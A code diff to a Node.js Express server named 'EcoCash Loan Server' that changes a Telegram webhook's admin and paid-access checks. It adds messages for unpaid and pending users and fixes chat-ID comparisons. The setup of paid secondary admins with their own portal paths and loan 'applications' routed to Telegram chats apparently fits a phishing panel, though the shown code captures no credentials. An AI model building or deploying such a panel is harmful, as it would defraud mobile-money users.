@@ -236,7 +236,8 @@ app.post('/api/telegram-webhook', async (req, res) => {
 
       const userStatus = authorizedUsers.get(userId);
 
-      if (chatId === masterChatId) {
+      // Main Admin check
+      if (chatId === masterChatId.toString()) {
         authorizedUsers.set(userId, 'PAID');
         const mainPath = '/Admin-0001';
         pathToAdminChat.set(mainPath, chatId);
@@ -254,6 +255,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
         return;
       }
 
+      // Secondary Admin who is already PAID
       if (userStatus === 'PAID' && secondaryAdmins.has(userId)) {
         const assignedPath = secondaryAdmins.get(userId);
         const portalUrl = `https://${req.get('host')}${assignedPath}`;
@@ -268,6 +270,30 @@ app.post('/api/telegram-webhook', async (req, res) => {
         return;
       }
 
+      // Prevent secondary admins from spamming new registration requests to the main admin if they already exist or are denied
+      if (userStatus === 'UNPAID') {
+        const deniedText = `⚠️ <b>Access Denied</b>\n\nYour account status is marked as <b>UNPAID</b> by the administrator.`;
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: chatId, text: deniedText, parse_mode: 'HTML' })
+        });
+        return;
+      }
+
+      // If user is already pending, don't spam the main admin with duplicate cards
+      if (userStatus === 'PENDING') {
+        const pendingAgainText = `👋 Hello <b>${fullName}</b>,\n\n` +
+                                 `Your access request is already pending review by the main administrator. Please wait for clearance.`;
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: chatId, text: pendingAgainText, parse_mode: 'HTML' })
+        });
+        return;
+      }
+
+      // New user triggering /start for the first time -> Send registration request ONLY to Main Admin
       authorizedUsers.set(userId, 'PENDING');
       savePersistentData();
 
@@ -317,11 +343,11 @@ app.post('/api/telegram-webhook', async (req, res) => {
   const messageId = callback_query.message.message_id;
 
   if (actionData.startsWith('access_paid_') || actionData.startsWith('access_unpaid_')) {
-    if (chatId !== masterChatId) {
+    if (chatId !== masterChatId.toString()) {
       await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ callback_query_id: callback_query.id, text: "Unauthorized action.", show_alert: true })
+        body: JSON.stringify({ callback_query_id: callback_query.id, text: "Unauthorized action. Main Admin only.", show_alert: true })
       });
       return;
     }
@@ -370,7 +396,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
 
   if (targetAppRef) {
     const appData = activeApplications.get(targetAppRef);
-    if (appData && appData.targetChatId && chatId !== appData.targetChatId) {
+    if (appData && appData.targetChatId && chatId !== appData.targetChatId.toString() && chatId !== masterChatId.toString()) {
       await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -448,4 +474,3 @@ app.get('*', (req, res) => {
 app.listen(PORT, () => {
   console.log(`🚀 EcoCash Loan Server running on port ${PORT}`);
 });
-                                                  
